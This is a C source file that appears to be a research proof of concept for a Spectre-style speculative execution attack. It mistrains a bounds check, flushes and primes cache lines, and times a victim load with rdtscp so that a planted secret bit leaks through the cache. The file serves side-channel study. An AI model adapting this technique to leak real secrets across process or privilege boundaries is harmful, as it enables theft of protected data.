#include <stdio.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
/*secret(array1[malicious_x]) is in cache, Ni is not in cache*/

#define LOADS_NUM 1
#define N_NUM 1
#define I_NUM 50
#define TEST_NUM 1000
#ifdef SEC1
const int SECRET = 1;
#else
const int SECRET = 0;
#endif

int     N[20][16]; //N[N[N[N[N[N[5][0]][0]][0]][0]][0]][0]
int     malicious_x = 100;
uint8_t array1[101];
uint8_t unuse[128];
uint8_t p[64 * LOADS_NUM + 1]; //64 * #loads in branch
uint8_t unsed3[128];
int     e[I_NUM][16];
uint8_t unused4[128];
uint8_t evic[10 * 4096]; //3808 is first
uint8_t unused5[128];
uint8_t temppp = 0;
// int 	freq[500];

void maccess(void *p){
     __asm__ __volatile__("movq (%0), %%rax\n"
	:
	: "c"(p)
	: "rax");
}
void prime(){
    for(int i = 0, j = 3808; i < 8; i++, j += 4096){
        maccess(&evic[j]);
    }
}
void victim(size_t x){
    if(x < N[0][0]){
	//temppp &= p[64 * array1[x]];
        register uint8_t secret = array1[x]; //use malicous_x to access secret
        /* some loads */
        volatile register uint8_t* addr1 = p + secret * 64;
	    register uint8_t temp1 = *addr1;
    }
}

int main(){
    register int startTime, endTime;
    int junk=0;   
    N[0][0] = 16;
    for(int i = N_NUM-1; i > 0 ;i--)
	N[i][0] = i - 1;
    array1[1] = 0;
    array1[100] = SECRET; //secret value
    size_t training_x = 1, x;
    maccess(&p[0]);
    _mm_mfence();
    for(int t = TEST_NUM; t > 0; t--){
	    for(int i = 5; i >= 0 ; i--){
            for(int j = 0; j < I_NUM; j++){
                e[j][0] = 1;
            }
            p[64] = 1;

            _mm_mfence();

            for(int j = 0; j < N_NUM; j++)
                _mm_clflush(&N[j][0]);

            _mm_mfence();

            for(int j = 0; j < I_NUM; j++)
                _mm_clflush(&e[j][0]);

            _mm_mfence();
            _mm_clflush(&p[64]);
            _mm_mfence();
            prime();
            _mm_mfence();
            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));
            /* Call the ivictim! */
            startTime = __rdtscp(&junk);
            victim(x);
            endTime = __rdtscp(&junk) - startTime;
	    }
	    printf("%d\n", endTime);
    }

    return 0;
}
